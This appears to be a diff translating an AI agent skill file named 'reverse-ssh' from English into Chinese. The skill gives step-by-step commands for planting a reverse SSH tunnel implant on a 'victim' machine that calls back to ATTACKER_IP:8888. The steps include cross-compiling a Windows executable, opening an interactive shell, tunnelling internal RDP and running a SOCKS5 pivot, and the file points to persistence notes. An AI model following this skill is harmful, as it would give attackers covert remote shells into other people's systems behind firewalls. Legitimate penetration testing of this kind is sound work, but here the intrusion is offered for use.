@@ -1,67 +1,64 @@
 ---
 name: reverse-ssh
 description: >
-  This skill should be used when the user asks about "reverse-ssh", "target is
-  not directly reachable and you need a stable SSH shell through outbound-only
-  connections". Establish reverse SSH tunnels from victim to attacker for
-  interactive shell access behind NAT/firewall.
+  此技能适用于用户询问关于 "reverse-ssh"、"目标不可直接访问，需要通过仅出站连接建立稳定 SSH shell" 等内容。从受害者向攻击者建立反向 SSH 隧道，实现 NAT/防火墙后的交互式 shell 访问。
 ---
 
 # Reverse-SSH
 
-Reverse SSH tunnel implant — SSH shell through outbound connection, no port forwarding needed.
+反向 SSH 隧道植入体 —— 通过出站连接建立 SSH shell，无需端口转发。
 
-## Quick Start
+## 快速开始
 
 ```bash
-# Attacker: start SSH server (any standard SSH server)
-# Default: binds on attacker port 8888
+# 攻击者：启动 SSH 服务器（任意标准 SSH 服务器）
+# 默认：在攻击者端口 8888 上监听
 
-# Victim: run reverse-ssh binary
+# 受害者：运行 reverse-ssh 二进制文件
 ./reverse-ssh <attacker_ip>:<port>
 
-# Attacker: connect back
-ssh -p 8888 localhost          # Interact with victim shell
-# Or list connected
+# 攻击者：反向连接
+ssh -p 8888 localhost          # 与受害者 shell 交互
+# 或列出已连接的会话
 ssh -p 8888 127.0.0.1 ls
 ```
 
-## Common Flags
+## 常用参数
 
-| Flag | Purpose |
-|------|---------|
-| `-p PORT` | Local bind port on victim |
-| `--ssh-port N` | Attacker SSH server port |
-| `-l USER` | Login user |
-| `--socks5` | Enable SOCKS5 proxy |
-| `--foreground` | Don't daemonize |
+| 参数 | 用途 |
+|------|------|
+| `-p PORT` | 受害者本地绑定端口 |
+| `--ssh-port N` | 攻击者 SSH 服务器端口 |
+| `-l USER` | 登录用户 |
+| `--socks5` | 启用 SOCKS5 代理 |
+| `--foreground` | 不后台化（不守护进程） |
 
-## Common Workflows
+## 常用工作流程
 
-**Deploy reverse shell:**
+**部署反向 shell：**
 ```bash
-# Compile for Windows target (from Linux)
+# 为 Windows 目标交叉编译（在 Linux 上）
 GOOS=windows GOARCH=amd64 go build -o rev.exe .
-# Transfer to victim, execute:
+# 传输到受害者并执行：
 rev.exe ATTACKER_IP:8888
 ```
 
-**Port forwarding via reverse SSH:**
+**通过反向 SSH 进行端口转发：**
 ```bash
-# From attacker, tunnel internal RDP
+# 在攻击者端隧道内网 RDP
 ssh -p 8888 -L 3389:127.0.0.1:3389 localhost
-# Connect RDP client to localhost:3389
+# 将 RDP 客户端连接到 localhost:3389
 ```
 
-**SOCKS5 proxy:**
+**SOCKS5 代理：**
 ```bash
 ./reverse-ssh --socks5 ATTACKER:8888
-# SSH with -D for SOCKS
+# 使用 -D 参数建立 SOCKS 隧道
 ssh -p 8888 -D 1080 localhost
 ```
 
-## Resources
+## 资源
 
-| File | When to load |
-|------|--------------|
-| `references/` | Persistence and cross-compile notes |
+| 文件 | 加载时机 |
+|------|----------|
+| `references/` | 持久化与交叉编译说明 |
